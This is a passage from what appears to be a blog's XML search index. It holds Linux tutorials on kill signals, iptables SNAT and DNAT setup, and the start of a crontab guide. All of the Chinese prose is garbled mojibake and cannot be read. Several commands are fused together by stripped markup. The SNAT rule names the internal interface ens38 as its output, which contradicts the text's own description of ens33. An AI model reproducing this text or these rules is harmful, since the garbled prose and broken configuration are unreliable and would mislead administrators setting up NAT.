å‘½ä»¤çš„è¿›ç¨‹ç»ˆæ­¢ä¿¡å·</h3><table><thead><tr><th><strong>é€‰é¡¹</strong></th><th><strong>ä¿¡å·ç¼–å·</strong></th><th><strong>è¡ŒåŠ¨</strong></th></tr></thead><tbody><tr><td>SIGTERM</td><td>15</td><td>SIGTERM ä¿¡å·ç”¨äºå‘Šè¯‰è¿›ç¨‹æ­£å¸¸ç»“æŸã€‚è¯¥ç»ˆæ­¢ä¿¡å·å¯èƒ½ä¼šè¢«è¿›ç¨‹è§£é‡Šï¼Œä¹Ÿå¯èƒ½ä¼šè¢«å¿½ç•¥ã€‚</td></tr><tr><td>SIGKILL</td><td>9</td><td>SIGKILL ä¿¡å·ç”¨äºå¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹ã€‚è¿™æ˜¯ä¸€ä¸ªæ— è®ºå¦‚ä½•éƒ½ä¸èƒ½è¢«è¿›ç¨‹å¿½ç•¥çš„ä¿¡å·ã€‚</td></tr><tr><td>â€‹SIGHUP</td><td>1</td><td>SIGHUP ä¿¡å·ç”¨äºâ€œæŒ‚æ–­â€è¿›ç¨‹ã€‚è¿™å¯ç”¨äºé‡æ–°å¯åŠ¨è¿›ç¨‹ã€‚</td></tr><tr><td>SIGINT</td><td>2</td><td>å½“ç”¨æˆ·æƒ³è¦ä¸­æ–­è¿›ç¨‹æ—¶ä½¿ç”¨ SIGINT ä¿¡å·ã€‚</td></tr></tbody></table><h3 id="å¸¸ç”¨å‚æ•°-4"><a href="#å¸¸ç”¨å‚æ•°-4" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>-l</td><td>åˆ—å‡ºç³»ç»Ÿæ”¯æŒçš„ä¿¡å·</td></tr><tr><td>-s</td><td>æŒ‡å®šå‘è¿›ç¨‹å‘é€çš„ä¿¡å·</td></tr><tr><td>-a</td><td>å¤„ç†å½“å‰è¿›ç¨‹æ—¶ä¸é™åˆ¶å‘½ä»¤åå’Œè¿›ç¨‹å·çš„å¯¹åº”å…³ç³»</td></tr><tr><td>-p</td><td>æŒ‡å®š kill å‘½ä»¤åªæ‰“å°ç›¸å…³è¿›ç¨‹çš„è¿›ç¨‹å·ï¼Œè€Œä¸å‘é€ä»»ä½•ä¿¡å·</td></tr><tr><td>-l</td><td>åˆ—å‡ºç³»ç»Ÿæ”¯æŒçš„ä¿¡å·</td></tr></tbody></table><h3 id="ç”¨ä¾‹-4"><a href="#ç”¨ä¾‹-4" class="headerlink" title="ç”¨ä¾‹"></a>ç”¨ä¾‹</h3><h4 id="åˆ—å‡ºç³»ç»Ÿæ”¯æŒçš„ä¿¡å·åˆ—è¡¨"><a href="#åˆ—å‡ºç³»ç»Ÿæ”¯æŒçš„ä¿¡å·åˆ—è¡¨" class="headerlink" title="åˆ—å‡ºç³»ç»Ÿæ”¯æŒçš„ä¿¡å·åˆ—è¡¨"></a>åˆ—å‡ºç³»ç»Ÿæ”¯æŒçš„ä¿¡å·åˆ—è¡¨</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="kill-æ€æ‰æŒ‡å®š-pid-çš„è¿›ç¨‹"><a href="#kill-æ€æ‰æŒ‡å®š-pid-çš„è¿›ç¨‹" class="headerlink" title="kill æ€æ‰æŒ‡å®š pid çš„è¿›ç¨‹"></a>kill æ€æ‰æŒ‡å®š pid çš„è¿›ç¨‹</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> <span class="token punctuation">[</span>PID<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ¹æ®è¿›ç¨‹åç§°æ€æ‰ç›¸å…³è¿›ç¨‹"><a href="#æ ¹æ®è¿›ç¨‹åç§°æ€æ‰ç›¸å…³è¿›ç¨‹" class="headerlink" title="æ ¹æ®è¿›ç¨‹åç§°æ€æ‰ç›¸å…³è¿›ç¨‹"></a>æ ¹æ®è¿›ç¨‹åç§°æ€æ‰ç›¸å…³è¿›ç¨‹</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">killall</span> httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å¼ºåˆ¶å…³é—­è¿›ç¨‹"><a href="#å¼ºåˆ¶å…³é—­è¿›ç¨‹" class="headerlink" title="å¼ºåˆ¶å…³é—­è¿›ç¨‹"></a>å¼ºåˆ¶å…³é—­è¿›ç¨‹</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> -9 <span class="token punctuation">[</span>PID<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptablesé…ç½®SNATå’ŒDNAT</title>
      <link href="/post/52179055.html"/>
      <url>/post/52179055.html</url>
      
        <content type="html"><![CDATA[<h1 id="iptables-é…ç½®-SNAT-å’Œ-DNAT"><a href="#iptables-é…ç½®-SNAT-å’Œ-DNAT" class="headerlink" title="iptables é…ç½® SNAT å’Œ DNAT"></a>iptables é…ç½® SNAT å’Œ DNAT</h1><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>NAT çš„å…¨ç§°æ˜¯ã€Œç½‘ç»œåœ°å€è½¬æ¢ã€ï¼ˆNetwork Address Translationï¼‰ï¼ŒæŒ‡çš„æ˜¯è·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡ï¼Œåœ¨ä¼ è¾“æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œæ”¹å˜æ•°æ®ä¸­çš„ IP åœ°å€çš„ä¸€ç§æŠ€æœ¯ã€‚NAT å¯ä»¥åˆ†ä¸º SNATï¼ˆSource Network Address Translationï¼Œæºåœ°å€è½¬æ¢ï¼‰å’Œ DNATï¼ˆDestination Network Address Translationï¼Œç›®çš„åœ°å€è½¬æ¢ï¼‰ï¼ŒSNAT ä¸»è¦æ˜¯ç”¨æ¥åšé»˜è®¤ç½‘å…³çš„ï¼Œè€Œ DNAT ä¸»è¦æ˜¯ç”¨æ¥åšç«¯å£æ˜ å°„çš„ã€‚<br>æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨ Linux çš„ iptables æ¥å®ç° SNAT å’Œ DNATã€‚</p><h2 id="äºŒã€åŸç†"><a href="#äºŒã€åŸç†" class="headerlink" title="äºŒã€åŸç†"></a>äºŒã€åŸç†</h2><h3 id="SNAT"><a href="#SNAT" class="headerlink" title="SNAT"></a>SNAT</h3><p>SNAT å…¨ç§°æ˜¯ã€Œæºåœ°å€è½¬æ¢ã€ï¼ˆSource Network Address Translationï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒæ˜¯ä¸€ç§é€šå¸¸åœ¨ä»ç§æœ‰ IP åœ°å€è¿æ¥åˆ°å…¬å…± IP åœ°å€æ—¶è½¬æ¢æº IP åœ°å€çš„æŠ€æœ¯ã€‚å½“å†…éƒ¨ä¸»æœºéœ€è¦å‘å¤–éƒ¨ä¸»æœºæˆ–å…¬å…±ä¸»æœºå‘èµ·è¯·æ±‚æ—¶ï¼Œå®ƒæ˜¯æœ€å¸¸è§çš„ NAT å½¢å¼ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628166191160-920da5c5-7e0d-4ba0-8173-2f4cf7ebae9b.png#clientId=u28837019-f0e4-4&amp;from=paste&amp;height=237&amp;id=uc82db7db&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=237&amp;originWidth=645&amp;originalType=binary%E2%88%B6=1&amp;size=21322&amp;status=done&amp;style=none&amp;taskId=u90bcbc70-1a49-4b71-ac6e-ab2cc01359e&amp;width=645" alt="image.png"></p><h3 id="DNAT"><a href="#DNAT" class="headerlink" title="DNAT"></a>DNAT</h3><p>DNAT å…¨ç§°æ˜¯ã€Œç›®æ ‡åœ°å€è½¬æ¢ã€ï¼ˆDestination Network Address Translationï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯ä¸€ç§ä¸€èˆ¬åœ¨ä»å…¬ç½‘ IP åœ°å€è¿æ¥åˆ°ç§æœ‰ IP åœ°å€æ—¶ï¼Œå¯¹ç›®çš„ IP åœ°å€è¿›è¡Œè½¬æ¢çš„æŠ€æœ¯ã€‚å®ƒé€šå¸¸ç”¨äºå°†ç›®çš„åœ°ä¸ºç‰¹å®š IP åœ°å€æˆ– IP åœ°å€ä¸Šçš„ç‰¹å®šç«¯å£çš„æ•°æ®åŒ…é‡å®šå‘åˆ°ä¸€ä¸ªä¸»æœºä¸Šçš„ä¸åŒåœ°å€ï¼Œä¸»è¦æ˜¯åœ¨ä¸åŒçš„ä¸»æœºä¸Šã€‚<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628166201445-fe5d0812-4264-41ed-9c41-32cb0c2ca457.png#clientId=u28837019-f0e4-4&amp;from=paste&amp;height=237&amp;id=u536e6649&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=237&amp;originWidth=645&amp;originalType=binary%E2%88%B6=1&amp;size=21205&amp;status=done&amp;style=none&amp;taskId=uced93e81-ca83-4c15-bbf9-dc4e9e19ede&amp;width=645" alt="image.png"></p><h3 id="SNAT-å’Œ-DNAT-å¯¹æ¯”"><a href="#SNAT-å’Œ-DNAT-å¯¹æ¯”" class="headerlink" title="SNAT å’Œ DNAT å¯¹æ¯”"></a>SNAT å’Œ DNAT å¯¹æ¯”</h3><table><thead><tr><th>èŒƒå›´</th><th>SNAT</th><th>DNAT</th></tr></thead><tbody><tr><td>åç§°</td><td>æºåœ°å€è½¬æ¢</td><td>ç›®çš„åœ°å€è½¬æ¢</td></tr><tr><td>ç®€ä»‹</td><td>SNAT å°†æºä¸»æœºçš„ç§æœ‰ IP åœ°å€æ›´æ”¹ä¸ºå…¬å…± IP åœ°å€ã€‚å®ƒè¿˜å¯èƒ½æ›´æ”¹ TCP/UDP æ ‡å¤´ä¸­çš„æºç«¯å£ã€‚SNAT é€šå¸¸ç”±å†…éƒ¨ç”¨æˆ·è®¿é—® Internetã€‚</td><td>ç›®æ ‡ NAT æ›´æ”¹æ•°æ®åŒ… IP æ ‡å¤´ä¸­çš„ç›®æ ‡åœ°å€ã€‚å®ƒè¿˜å¯èƒ½æ›´æ”¹ TCP/UDP æ ‡å¤´ä¸­çš„ç›®æ ‡ç«¯å£ã€‚å½“æˆ‘ä»¬éœ€è¦å°†ç›®çš„åœ°ä¸ºå…¬å…±åœ°å€/ç«¯å£çš„ä¼ å…¥æ•°æ®åŒ…é‡å®šå‘åˆ°ç½‘ç»œå†…çš„ç§æœ‰ IP åœ°å€/ç«¯å£æ—¶ï¼Œä¼šä½¿ç”¨ DNATã€‚</td></tr><tr><td>ä½¿ç”¨åœºæ™¯</td><td>å±€åŸŸç½‘å†…æˆ–é˜²ç«å¢™åé¢çš„å®¢æˆ·ç«¯æƒ³è¦æµè§ˆäº’è”ç½‘</td><td>åœ¨é˜²ç«å¢™åé¢çš„æ•°æ®ä¸­å¿ƒå†…æ‰˜ç®¡çš„ç½‘ç«™ï¼Œéœ€è¦ç”¨æˆ·é€šè¿‡ Internet è®¿é—®</td></tr><tr><td>åœ°å€å˜æ›´</td><td>SNAT æ”¹å˜é€šè¿‡ NAT è®¾å¤‡çš„æ•°æ®åŒ…çš„æºåœ°å€</td><td>DNAT æ”¹å˜é€šè¿‡è·¯ç”±å™¨çš„æ•°æ®åŒ…çš„ç›®çš„åœ°å€</td></tr><tr><td>æ“ä½œé¡ºåº</td><td>SNAT åœ¨åšå‡ºè·¯ç”±å†³å®šåæ‰§è¡Œã€‚</td><td>DNAT åœ¨åšå‡ºè·¯ç”±å†³å®šä¹‹å‰æ‰§è¡Œã€‚</td></tr><tr><td>é€šè®¯æµç¨‹</td><td>å½“å†…éƒ¨å®‰å…¨ç½‘ç»œå‘èµ·ä¸å¤–éƒ¨ä¸–ç•Œçš„é€šä¿¡æ—¶ï¼Œå°±ä¼šå‘ç”Ÿ SNAT</td><td>å½“å¤–éƒ¨ä¸å®‰å…¨ç½‘ç»œå‘èµ·ä¸å†…éƒ¨å®‰å…¨ç½‘ç»œçš„é€šä¿¡æ—¶ï¼Œå°±ä¼šå‘ç”Ÿ DNAT</td></tr></tbody></table><p>| å•/å¤šä¸»æœº</p><p>| SNAT å…è®¸â€œå†…éƒ¨â€ç½‘ç»œä¸Šçš„å¤šä¸ªä¸»æœºè®¿é—®â€œå¤–éƒ¨â€ç½‘ç»œä¸Šçš„ä»»ä½•ä¸»æœº | DNAT å…è®¸â€œå¤–éƒ¨â€ç½‘ç»œä¸Šçš„ä»»ä½•ä¸»æœºè®¿é—®â€œå†…éƒ¨â€ç½‘ç»œä¸Šçš„å•ä¸ªä¸»æœº |</p><h2 id="ä¸‰ã€é…ç½®-SNAT"><a href="#ä¸‰ã€é…ç½®-SNAT" class="headerlink" title="ä¸‰ã€é…ç½® SNAT"></a>ä¸‰ã€é…ç½® SNAT</h2><h3 id="ç½‘ç»œæ¥å£é…ç½®"><a href="#ç½‘ç»œæ¥å£é…ç½®" class="headerlink" title="ç½‘ç»œæ¥å£é…ç½®"></a>ç½‘ç»œæ¥å£é…ç½®</h3><p>å†…ç½‘ä¸»æœºï¼ˆå¤šå°ï¼‰ï¼š</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>æ¥å£åç§°</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>local01</td><td>ens33</td><td>192.168.1.3</td><td>192.168.1.2</td><td>255.255.255.0</td></tr><tr><td>local02</td><td>ens33</td><td>192.168.1.4</td><td>192.168.1.2</td><td>255.255.255.0</td></tr></tbody></table><blockquote><p>è¿™é‡Œä»¥ä¸¤å°å†…ç½‘ä¸»æœºä¸ºä¾‹ï¼Œé»˜è®¤æƒ…å†µä¸‹å‡æ— æ³•è®¿é—®å¤–ç½‘</p></blockquote><p>â€‹</p><p>å†…ç½‘ä¸»æœº DNS é…ç½®ï¼ˆ/etc/resolv.confï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NAT ä¸»æœºï¼ˆ1 å°ï¼‰ï¼š</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>æ¥å£åç§°</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>nathost</td><td>ens33</td><td>192.168.2.35</td><td>192.168.2.2</td><td>255.255.255.0</td></tr><tr><td>nathost</td><td>ens38</td><td>192.168.1.2</td><td>â€‹</td><td></td></tr><tr><td>255.255.255.0</td><td></td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>nathost ä¸»æœºå¯ä»¥é€šè¿‡ ens33 æ¥å£è®¿é—®å¤–ç½‘</p></blockquote><p>â€‹</p><p>NAT ä¸»æœº DNS é…ç½®ï¼ˆ/etc/resolv.confï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.2.2nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><h3 id="NAT-ä¸»æœºé…ç½®"><a href="#NAT-ä¸»æœºé…ç½®" class="headerlink" title="NAT ä¸»æœºé…ç½®"></a>NAT ä¸»æœºé…ç½®</h3><h4 id="å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘"><a href="#å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘" class="headerlink" title="å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘"></a>å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘</h4><p>è¦é…ç½® NATï¼Œå¿…é¡»å¼€å¯ Linux å†…æ ¸çš„è½¬å‘åŠŸèƒ½ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/net/ipv4/ip_forward  <span class="token comment" spellcheck="true"># ä¸´æ—¶ç”Ÿæ•ˆï¼Œé‡å¯å¤±æ•ˆ</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦æ°¸ä¹…ç”Ÿæ•ˆï¼Œéœ€è¦ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/sysctl.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹å…¶ä¸­çš„ <code>net.ipv4.ip_forward = 1</code>â€‹<br>ç„¶åæ‰§è¡Œï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">sysctl -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç«‹åˆ»ç”Ÿæ•ˆã€‚<br>â€‹</p><h4 id="å…³é—­-firewalld"><a href="#å…³é—­-firewalld" class="headerlink" title="å…³é—­ firewalld"></a>å…³é—­ firewalld</h4><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop firewalldsystemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="å¼€å¯-iptables-FORWARD-è½¬å‘"><a href="#å¼€å¯-iptables-FORWARD-è½¬å‘" class="headerlink" title="å¼€å¯ iptables FORWARD è½¬å‘"></a>å¼€å¯ iptables FORWARD è½¬å‘</h4><pre class="line-numbers language-bash"><code class="language-bash">iptables -P FORWARD ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é…ç½®-SNAT"><a href="#é…ç½®-SNAT" class="headerlink" title="é…ç½® SNAT"></a>é…ç½® SNAT</h4><p>å°† 192.168.1.0/24 ç½‘æ®µçš„æ•°æ®åŒ…çš„æºåœ°å€ä¿®æ”¹ä¸º 192.168.2.35ï¼Œé€šè¿‡ç½‘ç»œæ¥å£ ens33 é€å‡ºï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o ens38 -j SNAT --to-source 192.168.2.35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦å¤–ä¸€ç§æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o ens38 -j MASQUERADE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®Œæˆé…ç½®å 192.168.1.0/24 çš„å†…ç½‘ä¸»æœºå³å¯è®¿é—®å¤–ç½‘ï¼<br>â€‹</p><h2 id="å››ã€é…ç½®-DNAT"><a href="#å››ã€é…ç½®-DNAT" class="headerlink" title="å››ã€é…ç½® DNAT"></a>å››ã€é…ç½® DNAT</h2><h3 id="ç½‘ç»œæ¥å£é…ç½®-1"><a href="#ç½‘ç»œæ¥å£é…ç½®-1" class="headerlink" title="ç½‘ç»œæ¥å£é…ç½®"></a>ç½‘ç»œæ¥å£é…ç½®</h3><p>å†…ç½‘ä¸»æœºï¼ˆ1 å°ï¼‰ï¼š</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>æ¥å£åç§°</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>local</td><td>ens33</td><td>192.168.1.3</td><td>192.168.1.2</td><td>255.255.255.0</td></tr></tbody></table><blockquote><p>é»˜è®¤æƒ…å†µä¸‹å¤–ç½‘ä¸»æœºæ— æ³•ç›´æ¥è®¿é—®è¯¥ä¸»æœº</p></blockquote><p>å†…ç½‘ä¸»æœº DNS é…ç½®ï¼ˆ/etc/resolv.confï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NAT ä¸»æœºï¼ˆ1 å°ï¼‰ï¼š</p><table><thead><tr><th><strong>hostname</strong></th><th><strong>æ¥å£åç§°</strong></th><th><strong>IPADDR</strong></th><th><strong>GATEWAY</strong></th><th><strong>NETMASK</strong></th></tr></thead><tbody><tr><td>nathost</td><td>ens33</td><td>192.168.2.35</td><td>192.168.2.2</td><td>255.255.255.0</td></tr><tr><td>nathost</td><td>ens38</td><td>192.168.1.2</td><td>â€‹</td><td></td></tr><tr><td>255.255.255.0</td><td></td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>å¤–ç½‘å¯ä»¥é€šè¿‡ ens33 æ¥å£è®¿é—® nathost ä¸»æœº</p></blockquote><p>NAT ä¸»æœº DNS é…ç½®ï¼ˆ/etc/resolv.confï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.2.2nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NAT-ä¸»æœºé…ç½®-1"><a href="#NAT-ä¸»æœºé…ç½®-1" class="headerlink" title="NAT ä¸»æœºé…ç½®"></a>NAT ä¸»æœºé…ç½®</h3><h4 id="å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘-1"><a href="#å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘-1" class="headerlink" title="å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘"></a>å¼€å¯å†…æ ¸æ•°æ®åŒ…è½¬å‘</h4><p>è¦é…ç½® NATï¼Œå¿…é¡»å¼€å¯ Linux å†…æ ¸çš„è½¬å‘åŠŸèƒ½ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/net/ipv4/ip_forward  <span class="token comment" spellcheck="true"># ä¸´æ—¶ç”Ÿæ•ˆï¼Œé‡å¯å¤±æ•ˆ</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦æ°¸ä¹…ç”Ÿæ•ˆï¼Œéœ€è¦ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/sysctl.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹å…¶ä¸­çš„ <code>net.ipv4.ip_forward = 1</code>â€‹<br>ç„¶åæ‰§è¡Œï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">sysctl -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç«‹åˆ»ç”Ÿæ•ˆã€‚<br>â€‹</p><h4 id="å…³é—­-firewalld-1"><a href="#å…³é—­-firewalld-1" class="headerlink" title="å…³é—­ firewalld"></a>å…³é—­ firewalld</h4><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop firewalldsystemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="å¼€å¯-iptables-FORWARD-è½¬å‘-1"><a href="#å¼€å¯-iptables-FORWARD-è½¬å‘-1" class="headerlink" title="å¼€å¯ iptables FORWARD è½¬å‘"></a>å¼€å¯ iptables FORWARD è½¬å‘</h4><pre class="line-numbers language-bash"><code class="language-bash">iptables -P FORWARD ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é…ç½®-DNAT"><a href="#é…ç½®-DNAT" class="headerlink" title="é…ç½® DNAT"></a>é…ç½® DNAT</h4><p>å°†å¯¹å¤–ç½‘ 192.168.2.35 ç½‘ç»œæ¥å£ ens33 çš„è®¿é—®ï¼Œæ˜ å°„åˆ°å¯¹å†…ç½‘ 192.168.1.3 ä¸Šï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -i ens33 -p tcp -d 192.168.2.35 --dport 80 -j DNAT --to-destination 192.168.1.3:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¿…é¡»è¿˜è¦åšä¸€ä¸ª SNATï¼Œè®©ç›®æ ‡æœåŠ¡å™¨èƒ½å¤ŸæŠŠæ•°æ®ä¼ å›æ¥ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o ens38 -j SNAT --to-source 192.168.2.35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å®Œæˆé…ç½®åè®¿é—® 192.168.2.35:80 çš„æµé‡å°±ä¼šè½¬å‘åˆ° 192.168.1.3:80 ä¸Šï¼</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ç½‘ç»œ </tag>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crontab è®¡åˆ’ä»»åŠ¡</title>
      <link href="/post/422dc34e.html"/>
      <url>/post/422dc34e.html</url>
      
        <content type="html"><![CDATA[<h1 id="crontab-è®¡åˆ’ä»»åŠ¡"><a href="#crontab-è®¡åˆ’ä»»åŠ¡" class="headerlink" title="crontab è®¡åˆ’ä»»åŠ¡"></a>crontab è®¡åˆ’ä»»åŠ¡</h1><h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>Crontab ä»£è¡¨ cron è¡¨ï¼Œå…¶ä¸­åŒ…å«ä»¥å›ºå®šæ—¶é—´é—´éš”è¿è¡Œçš„ä»»åŠ¡åˆ—è¡¨ã€‚ç„¶åè¿™äº›ä»»åŠ¡ç”±åä¸º cron çš„å®ˆæŠ¤è¿›ç¨‹æ‰§è¡Œã€‚æœºå™¨ä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥æ‹¥æœ‰å•ç‹¬çš„ crontabï¼Œå¸®åŠ©ä»–ä»¬æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ã€‚<br>â€‹</p><p>è¯­æ³•æ ¼å¼ï¼š<code>crontab [å‚æ•°]</code></p><h2 id="äºŒã€Linux-ä¸­åˆ›å»ºå’Œç¼–è¾‘-crontabs"><a href="#äºŒã€Linux-ä¸­åˆ›å»ºå’Œç¼–è¾‘-crontabs" class="headerlink" title="äºŒã€Linux ä¸­åˆ›å»ºå’Œç¼–è¾‘ crontabs"></a>äºŒã€Linux ä¸­åˆ›å»ºå’Œç¼–è¾‘ crontabs</h2><p>å¦‚æœæ‚¨ä»¥å‰ä»æœªä½¿ç”¨è¿‡ crontabï¼Œåˆ™éœ€è¦åˆ›å»ºä¸€ä¸ª crontab æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†åŒ…å«æ‰€æœ‰è®¡åˆ’ä»»åŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶å¯ä»¥ç®€å•åœ°é€šè¿‡ä»¥ä¸‹å‘½ä»¤åˆ›å»ºï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸‰ã€å¦‚ä½•æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼Ÿ"><a href="#ä¸‰ã€å¦‚ä½•æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼Ÿ" class="headerlink" title="ä¸‰ã€å¦‚ä½•æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼Ÿ"></a>ä¸‰ã€å¦‚ä½•æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼Ÿ</h2><p>åˆ›å»º crontab æ–‡ä»¶åï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯å‘è¯¥æ–‡ä»¶æ·»åŠ è®¡åˆ’ä»»åŠ¡ã€‚ç°åœ¨ï¼Œcron å…·æœ‰ç‰¹å®šæ ¼å¼ï¼Œå…·æœ‰ 6 ä¸ªå­—æ®µï¼Œå…¶é€šç”¨è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">minute<span class="token punctuation">(</span>s<span class="token punctuation">)</span> hour<span class="token punctuation">(</span>s<span class="token punctuation">)</span> day<span class="token punctuation">(</span>s<span class="token punctuation">)</span> month<span class="token punctuation">(</span>s<span class="token punctuation">)</span> weekday<span class="token punctuation">(</span>s<span class="token punctuation">)</span> command<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628160648491-969e5a7b-094d-49bd-a9f1-f3aa95b10008.png#clientId=u67e0b3f1-5c98-4&amp;from=paste&amp;height=199&amp;id=uc7c7c544&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=199&amp;originWidth=583&amp;originalType=binary%E2%88%B6=1&amp;size=30871&amp;status=done&amp;style=none&amp;taskId=u9b7d6bb5-6ef0-43c1-88c7-0a9d6eaf288&amp;width=583" alt="image.png"></p><table><thead><tr><th><strong>Fields</strong></th><th><strong>Values</strong></th></tr></thead><tbody><tr><td>Minutes</td><td>0-59</td></tr><tr><td>Hour</td><td>0-23</td></tr><tr><td>Day</td><td>1-31</td></tr><tr><td>Month</td><td>1-12</td></tr><tr><td>Weekday</td><td>0-6 (å…¶ä¸­ 